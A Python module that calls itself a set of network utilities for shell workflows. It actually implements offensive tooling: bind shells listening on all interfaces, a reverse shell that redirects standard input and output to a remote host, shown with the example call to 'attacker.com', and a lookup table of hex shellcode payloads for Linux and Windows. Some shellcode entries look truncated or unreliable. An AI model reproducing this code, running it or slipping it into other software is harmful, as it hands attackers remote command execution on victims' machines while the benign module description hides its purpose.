"""Network utilities for basic shell workflows."""

from __future__ import annotations

import os
import socket
import subprocess

__all__ = [
    "bind_shell",
    "bind_tcp_shell",
    "bind_telnet_shell",
    "generate_shellcode_list",
    "reverse_shell",
]


def bind_shell(host: str = "0.0.0.0", port: int = 4444, shell: str = "/bin/sh") -> None:
    """Create a bind shell that listens for incoming connections.

    Opens a socket and executes a shell when a client connects,
    forwarding input/output between the socket and shell process.

    Args:
        host: IP address to bind to (default: '0.0.0.0')
        port: Port to listen on (default: 4444)
        shell: Shell executable to run (default: '/bin/sh')

    Example:
        >>> bind_shell('0.0.0.0', 4444, '/bin/bash')
        [*] Listening on 0.0.0.0:4444
        [*] Connection from 192.168.1.100:52341
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(1)

    print(f"[*] Listening on {host}:{port}")
    conn, addr = server.accept()
    print(f"[*] Connection from {addr[0]}:{addr[1]}")

    process = subprocess.Popen(
        [shell],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break

            process.stdin.write(data)
            process.stdin.flush()

            output = process.stdout.read(4096)
            if output:
                conn.send(output)
    except KeyboardInterrupt:
        pass
    finally:
        conn.close()
        server.close()
        process.terminate()


def bind_tcp_shell(host: str = "0.0.0.0", port: int = 4444) -> None:
    """Create a TCP bind shell using /bin/bash.

    Convenience wrapper around bind_shell() that uses bash.

    Args:
        host: IP address to bind to (default: '0.0.0.0')
        port: Port to listen on (default: 4444)

    Example:
        >>> bind_tcp_shell('0.0.0.0', 8080)
    """
    bind_shell(host, port, "/bin/bash")


def bind_telnet_shell(host: str = "0.0.0.0", port: int = 23) -> None:
    """Create a telnet-style bind shell on port 23.

    Convenience wrapper around bind_shell() that uses /bin/sh on telnet port.

    Args:
        host: IP address to bind to (default: '0.0.0.0')
        port: Port to listen on (default: 23)

    Example:
        >>> bind_telnet_shell('0.0.0.0', 23)
    """
    bind_shell(host, port, "/bin/sh")


def generate_shellcode_list(arch: str = "x86", platform: str = "linux") -> list[str]:
    """Get a list of shellcode payloads for specific architecture and platform.

    Args:
        arch: Target architecture ('x86' or 'x64', default: 'x86')
        platform: Target platform ('linux' or 'windows', default: 'linux')

    Returns:
        List of shellcode strings in hex format

    Example:
        >>> shellcode = generate_shellcode_list('x64', 'linux')
        >>> len(shellcode)
        2
    """
    shellcode: dict[str, list[str]] = {
        "linux_x86": [
            "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80",
            "\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x63\\x89\\xe7\\x68\\x2f\\x73\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\xe8",
        ],
        "linux_x64": [
            "\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05",
            "\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x6a\\x06\\x5a\\x6a\\x29\\x58\\x0f\\x05",
        ],
        "windows_x86": [
            "\\x31\\xc9\\x51\\x68\\x63\\x61\\x6c\\x63\\x54\\xb8\\xc7\\x93\\xc2\\x77\\xff\\xd0",
        ],
        "windows_x64": [
            "\\x48\\x31\\xc9\\x48\\x81\\xe9\\xc6\\xff\\xff\\xff\\x48\\x8d\\x05\\xef\\xff\\xff\\xff",
        ],
    }

    key = f"{platform}_{arch}"
    return shellcode.get(key, [])


def reverse_shell(host: str, port: int, shell: str = "/bin/bash") -> None:
    """Create a reverse shell that connects to a remote host.

    Establishes a connection to a remote host and executes a shell,
    forwarding input/output between the connection and shell.

    Args:
        host: Remote host to connect to
        port: Remote port to connect to
        shell: Shell executable to run (default: '/bin/bash')

    Example:
        >>> reverse_shell('attacker.com', 4444)
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    p = subprocess.Popen([shell, "-i"])
    p.wait()
